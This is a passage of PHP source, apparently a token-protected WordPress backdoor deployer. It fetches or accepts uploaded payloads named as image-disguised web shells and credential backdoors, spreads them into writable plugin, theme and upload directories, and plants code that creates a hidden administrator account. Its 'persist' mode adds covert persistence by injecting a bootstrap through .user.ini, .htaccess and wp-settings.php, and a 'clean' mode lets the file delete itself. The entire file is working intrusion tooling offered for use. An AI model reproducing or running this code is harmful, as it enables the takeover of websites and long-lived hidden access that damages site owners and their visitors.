        $multi_report = _deploy_multi($payloads, $_PAYLOAD_ROLES, $dirs);
        $summary = _summarize_multi_report($multi_report);

        $result['status']   = 'ok';
        $result['wp_root']  = $wp_root;
        $result['summary']  = array_merge(['total_writable' => $total_writable], $summary);
        $result['details']  = $multi_report;
        break;

    // ── admin: create admin user ───────────────────────────────────────
    case 'admin':
        $wp_root = _find_wp_root();
        if (!$wp_root) {
            $result['error'] = 'wordpress root not found';
            break;
        }
        $result['status'] = 'ok';
        $result['admin']  = _trigger_admin_adder($wp_root);
        break;

    // ── deploy: upload + spread all payloads + admin-adder ─────────────
    case 'deploy':
        global $_PAYLOAD_ROLES;
        $payloads = _multi_stash_load();

        // Accept new multi-upload if POST
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $mu = _handle_multi_upload();
            if (empty($mu['error'])) {
                $payloads = _multi_stash_load();
            } else {
                // Fallback: single-file upload
                $su = _handle_upload();
                if (empty($su['error'])) {
                    $content = _get_stashed();
                    if ($content) {
                        _multi_stash_put('shell_png', $content);
                        $payloads = _multi_stash_load();
                    }
                }
            }
        }

        // Accept URL fetch per role: ?url_shell_png=...&url_shell_pdf=...
        foreach ($_GET as $gk => $gv) {
            if (strpos($gk, 'url_') === 0 && !empty($gv)) {
                $role = substr($gk, 4);
                $ft = _handle_fetch($gv);
                if (empty($ft['error'])) {
                    _multi_stash_put($role, _get_stashed());
                }
            }
        }
        $payloads = _multi_stash_load();

        // Accept base64 GET per role: ?d_shell_png=...&d_shell_pdf=...
        foreach ($_GET as $gk => $gv) {
            if (strpos($gk, 'd_') === 0 && !empty($gv)) {
                $role = substr($gk, 2);
                $dec = base64_decode($gv, true);
                if ($dec !== false) {
                    _multi_stash_put($role, $dec);
                }
            }
        }
        $payloads = _multi_stash_load();

        if (empty($payloads)) {
            $result['error'] = 'no files to deploy — POST multi-file JSON, use d_<role>=, or upload first';
            break;
        }

        $wp_root = _find_wp_root();
        if (!$wp_root) {
            $result['error'] = 'wordpress root not found';
            break;
        }

        // ── Multi-file spread ──
        $dirs = _collect_targets($wp_root);
        $total_writable = 0;
        foreach ($dirs as $arr) { $total_writable += count($arr); }

        $multi_report = _deploy_multi($payloads, $_PAYLOAD_ROLES, $dirs);
        $summary = _summarize_multi_report($multi_report);

        // ── Spread admin-adder to 1 different directory ──
        $adder_pool = array_merge($dirs['plugins'], $dirs['themes'],
                                  $dirs['uploads'], $dirs['others']);
        $adder_pool = array_values(array_diff($adder_pool, $summary['deployed_paths']));
        $adder_targets = [];
        if (!empty($adder_pool)) {
            shuffle($adder_pool);
            $adder_targets = [array_pop($adder_pool)];
        }
        $adder_content = _get_admin_adder_content();
        $adder_result = _deploy_content($adder_content, $adder_targets);

        // ── Admin creation: opt-in (?admin=1) ──
        $admin_result = null;
        if (!empty($_GET['admin']) && $_GET['admin'] === '1') {
            $admin_result = _trigger_admin_adder($wp_root);
        }

        $result['status']  = 'ok';
        $result['wp_root'] = $wp_root;
        $result['summary'] = array_merge(
            ['total_writable' => $total_writable],
            $summary,
            [
                'admin_adder_deployed' => count($adder_result['success']),
                'admin_result' => $admin_result
                    ? (($admin_result['status'] ?? '') === 'created'
                        ? "created:{$admin_result['user_id']}"
                        : ($admin_result['status'] ?? 'skipped'))
                    : 'not triggered (use ?admin=1 to create)',
            ]
        );
        $result['details']     = $multi_report;
        $result['admin_adder'] = [
            'target_dir' => !empty($adder_targets) ? $adder_targets[0] : null,
            'success'    => $adder_result['success'],
            'failed'     => $adder_result['failed'],
            'trigger'    => $admin_result,
        ];

        @unlink(_stash_path());
        _multi_stash_clear();
        break;

    // ── report: scan only, no writes ───────────────────────────────────────
    case 'report':
        $wp_root = _find_wp_root();
        if (!$wp_root) {
            $result['error'] = 'wordpress root not found';
            break;
        }

        $dirs = _collect_targets($wp_root);
        $result['status']  = 'ok';
        $result['wp_root'] = $wp_root;
        $result['writable'] = [
            'plugins'     => $dirs['plugins'],
            'themes'      => $dirs['themes'],
            'uploads'     => array_slice($dirs['uploads'], 0, 5),
            'others'      => $dirs['others'],
            'wp_includes' => $dirs['wp_includes'],
            'wp_admin'    => $dirs['wp_admin'] ?? [],
        ];
        $result['counts'] = [
            'plugins'     => count($dirs['plugins']),
            'themes'      => count($dirs['themes']),
            'uploads'     => count($dirs['uploads']),
            'others'      => count($dirs['others']),
            'wp_includes' => count($dirs['wp_includes']),
            'wp_admin'    => count($dirs['wp_admin'] ?? []),
        ];
        break;

    // ── env: detect server environment ──────────────────────────────────────
    case 'env':
        $wp_root = _find_wp_root();
        $result['status'] = 'ok';
        $result['environment'] = $wp_root
            ? _detect_environment($wp_root)
            : ['error' => 'wordpress root not found'];
        break;

    // ── persist: immortal horse deployment (multi-file) ───────────────────
    case 'persist':
        global $_PAYLOAD_ROLES;
        $payloads = _multi_stash_load();

        // Accept multi-upload via POST
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $mu = _handle_multi_upload();
            if (empty($mu['error'])) {
                $payloads = _multi_stash_load();
            } else {
                $su = _handle_upload();
                if (empty($su['error'])) {
                    $content = _get_stashed();
                    if ($content) {
                        _multi_stash_put('shell_png', $content);
                        $payloads = _multi_stash_load();
                    }
                }
            }
        }

        // Accept URL fetch per role
        foreach ($_GET as $gk => $gv) {
            if (strpos($gk, 'url_') === 0 && !empty($gv)) {
                $role = substr($gk, 4);
                $ft = _handle_fetch($gv);
                if (empty($ft['error'])) _multi_stash_put($role, _get_stashed());
            }
        }

        // Accept base64 GET per role
        foreach ($_GET as $gk => $gv) {
            if (strpos($gk, 'd_') === 0 && !empty($gv)) {
                $role = substr($gk, 2);
                $dec = base64_decode($gv, true);
                if ($dec !== false) _multi_stash_put($role, $dec);
            }
        }
        $payloads = _multi_stash_load();

        if (empty($payloads)) {
            $result['error'] = 'no files provided — POST multi-file JSON, use d_<role>=, or upload first';
            break;
        }

        $wp_root = _find_wp_root();
        if (!$wp_root) {
            $result['error'] = 'wordpress root not found';
            break;
        }

        // ── Step 1: Environment detection ──
        $env = _detect_environment($wp_root);

        // ── Step 2: Read guard prefix ──
        $guard = _get_guard_prefix();

        // ── Step 3: Wrap payloads with guard prefix (if available) ──
        if ($guard) {
            $wrapped = [];
            foreach ($payloads as $role => $raw) {
                $wrapped[$role] = $guard . $raw;
            }
        } else {
            $wrapped = $payloads;
        }

        // ── Step 4: Multi-file spread ──
        $dirs = _collect_targets($wp_root);
        $total_writable = 0;
        foreach ($dirs as $arr) { $total_writable += count($arr); }

        $multi_report = _deploy_multi($wrapped, $_PAYLOAD_ROLES, $dirs);
        $summary = _summarize_multi_report($multi_report);
        $deployed_paths = $summary['deployed_paths'];

        $persist_results = [];

        // ── Step 5: Deploy immortal-bootstrap.php ──
        $bootstrap_path = $wp_root . '/wp-content/immortal-bootstrap.php';
        $bootstrap_code = @file_get_contents(__DIR__ . '/immortal-bootstrap.php');
        $bootstrap_deployed = false;
        if ($bootstrap_code) {
            $bootstrap_deployed = (@file_put_contents($bootstrap_path, $bootstrap_code) !== false);
            @chmod($bootstrap_path, 0644);
        }
        $bootstrap_b64 = base64_encode($bootstrap_code ?: '');

        // ── Step 6: Inject .user.ini or .htaccess ──
        if ($env['is_fpm'] || $env['is_nginx']) {
            $persist_results['user_ini'] = _deploy_user_ini($wp_root, $bootstrap_path);
        }
        if ($env['is_apache'] && $env['sapi'] === 'apache2handler') {
            $persist_results['htaccess'] = _deploy_htaccess($wp_root, $bootstrap_path);
        }

        // ── Step 7: Inject wp-settings.php ──
        $persist_results['wp_settings'] = _deploy_wp_settings($wp_root, $bootstrap_path, $bootstrap_b64);

        // ── Step 8: Initialize state file (tracks ALL deployed files) ──
        // Use first shell payload as source reference for state
        $first_payload = reset($wrapped) ?: '';
        $state_info = _init_state_file($deployed_paths, $persist_results, $first_payload, $wp_root);

        // ── Step 9: Generate clean key ──
        $clean_key = _generate_clean_key($state_info);

        // ── Step 10: Spread admin-adder to 1 different dir ──
        $adder_pool = [];
        foreach ($dirs as $arr) { $adder_pool = array_merge($adder_pool, $arr); }
        $adder_pool = array_values(array_diff($adder_pool, $deployed_paths));
        $adder_targets = [];
        if (!empty($adder_pool)) {
            shuffle($adder_pool);
            $adder_targets = [array_pop($adder_pool)];
        }
        $adder_content = _get_admin_adder_content();
        $adder_composite = $guard ? ($guard . $adder_content) : $adder_content;
        $adder_result = _deploy_content($adder_composite, $adder_targets);

        // ── Step 11: Optional admin creation ──
        $admin_result = null;
        if (!empty($_GET['admin']) && $_GET['admin'] === '1') {
            $admin_result = _trigger_admin_adder($wp_root);
        }

        // ── Build response ──
        $result['status']   = 'ok';
        $result['wp_root']  = $wp_root;
        $result['environment'] = [
            'sapi'     => $env['sapi'],
            'server'   => $env['server'],
            'strategy' => $env['strategy'],
        ];
        $result['summary']  = array_merge(
            ['total_writable' => $total_writable],
            $summary,
            [
                'guard_prefix'          => $guard ? 'applied' : 'not found (deployed raw)',
                'bootstrap_deployed'    => $bootstrap_deployed,
                'bootstrap_path'        => $bootstrap_path,
                'layers_deployed'       => array_keys(array_filter($persist_results, function($r) {
                    return ($r['action'] ?? '') !== 'skipped' && !in_array($r['action'] ?? '', ['failed']);
                })),
                'admin_adder_deployed'  => count($adder_result['success']),
                'admin_result'          => $admin_result
                    ? (($admin_result['status'] ?? '') === 'created'
                        ? "created:{$admin_result['user_id']}"
                        : ($admin_result['status'] ?? 'skipped'))
                    : 'not triggered (use ?admin=1 to create)',
            ]
        );
        $result['details']   = $multi_report;
        $result['layers']    = $persist_results;
        $result['admin_adder'] = [
            'target_dir' => !empty($adder_targets) ? $adder_targets[0] : null,
            'success'    => $adder_result['success'],
            'failed'     => $adder_result['failed'],
        ];
        $result['state_file'] = $state_info;
        $result['clean_key']  = $clean_key;
        $result['_note']      = 'SAVE THE CLEAN KEY. It is shown only once and required to remove all persistence.';

        @unlink(_stash_path());
        _multi_stash_clear();
        break;

    // ── clean: self-destruct ──────────────────────────────────────────────
    case 'clean':
        $mode = $_GET['mode'] ?? 'self';

        // mode=all requires clean_key password
        if ($mode === 'all') {
            $clean_key = $_GET['clean_key'] ?? $_POST['clean_key'] ?? '';
            if (empty($clean_key) || !_verify_clean_key($clean_key)) {
                $_HRC(404);
                exit;
            }

            // Remove all mesh copies
            $host = $_SERVER['HTTP_HOST'] ?? 'cli';
            $host_hash = md5($host . __DIR__);
            $state_files = [
                '/tmp/.' . $host_hash . '.dat',
            ];
            $wp_root = _find_wp_root();
            if ($wp_root) {
                $state_files[] = $wp_root . '/wp-content/.' . $host_hash . '.dat';
            }

            foreach ($state_files as $sf) {
                if (!file_exists($sf)) continue;
                $data = json_decode(file_get_contents($sf), true);
                if (!$data) continue;

                // Delete all mesh copies
                foreach (($data['mesh'] ?? []) as $node) {
                    @unlink($node['path']);
                }

                // Delete bootstrap
                $boot = $data['layers']['user_ini']['bootstrap_path']
                     ?? $data['layers']['wp_settings']['bootstrap_path']
                     ?? null;
                if ($boot) @unlink($boot);

                // Delete .user.ini
                $ini = $data['layers']['user_ini']['ini_path'] ?? null;
                if ($ini) @unlink($ini);

                // Delete .htaccess if ours (check for auto_prepend_file)
                $ht = $data['layers']['htaccess']['htaccess_path'] ?? null;
                if ($ht && file_exists($ht)) {
                    $htc = @file_get_contents($ht);
                    if ($htc && strpos($htc, 'auto_prepend_file') !== false) {
                        @unlink($ht);
                    }
                }

                // Restore wp-settings from backup
                $bak = $data['layers']['wp_settings']['backup_path'] ?? null;
                $ws  = $data['layers']['wp_settings']['settings_path'] ?? null;
                if ($bak && $ws && file_exists($bak)) {
                    @rename($bak, $ws . '.restored');
                    @copy($bak, $ws);
                    @touch($ws, filemtime($bak));
                }

                // Delete state files
                @unlink($sf);
            }

            // Self-destruct deploy.php
            $self = __FILE__;
            $tmp  = $self . '.' . getmypid() . '.tmp';
            @rename($self, $tmp);
            @unlink($tmp);
            @unlink(_stash_path());
            _multi_stash_clear();
            foreach ((array)@glob(dirname($self) . '/' . basename($self) . '.*.tmp') as $o) {
                @unlink($o);
            }

            $result['status'] = 'ok';
            $result['action'] = 'clean_all';
        } else {
            // mode=self: only delete deploy.php itself
            $self = __FILE__;
            $tmp  = $self . '.' . getmypid() . '.tmp';
            @rename($self, $tmp);
            @unlink($tmp);
            @unlink(_stash_path());
            _multi_stash_clear();
            foreach ((array)@glob(dirname($self) . '/' . basename($self) . '.*.tmp') as $o) {
                @unlink($o);
            }
            $result['status'] = 'ok';
            $result['action'] = 'self_destruct';
        }
        break;

    // ── default: help info ─────────────────────────────────────────────────
    default:
        $result['status'] = 'ok';
        $result['action'] = 'info';
        $result['help']   = [
            'modes' => [
                'upload'  => 'Multi-file: POST JSON {role:b64,...} or fields d_<role>=<b64>. Single: d=<b64> or raw body',
                'fetch'   => 'Per-role: ?role=<role>&url=<url> or ?role=<role>&d=<b64>. Legacy: ?url=<url>',
                'spread'  => 'Deploy all stashed files to WP dirs (each role to distinct zones)',
                'deploy'  => 'Upload + spread all payloads + admin-adder (add ?admin=1 to create user)',
                'admin'   => 'Create admin user (opt-in)',
                'report'  => 'Scan writable directories (no writes)',
                'env'     => 'Detect server environment (SAPI, server, strategy)',
                'persist' => 'Immortal: guard-wrap + multi-spread + layers + state (multi-file)',
                'clean'   => 'Self-destruct (?mode=all&clean_key=KEY for full cleanup)',
            ],
            'roles'       => array_keys($_PAYLOAD_ROLES),
            'role_config' => $_PAYLOAD_ROLES,
            'token'       => $_TOKEN,
            'usage_example' => [
                'multi_upload' => 'POST ?a=upload&x=TOKEN  Content-Type:application/json  {"shell_png":"<b64>","shell_pdf":"<b64>","shell_gif":"<b64>","backdoor_login":"<b64>","backdoor_creds":"<b64>"}',
                'multi_deploy' => 'POST ?a=deploy&x=TOKEN  (same JSON body, uploads + deploys in one step)',
                'per_role_fetch' => 'GET ?a=fetch&x=TOKEN&role=shell_png&url=http://...',
                'spread_all'   => 'GET ?a=spread&x=TOKEN  (deploys all previously stashed roles)',
            ],
        ];
        break;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Output
// ═══════════════════════════════════════════════════════════════════════════════
$_HDR('Content-Type: application/json; charset=utf-8');
$_HDR('X-Deploy: ' . ($result['status'] ?? 'unknown'));
echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
exit;
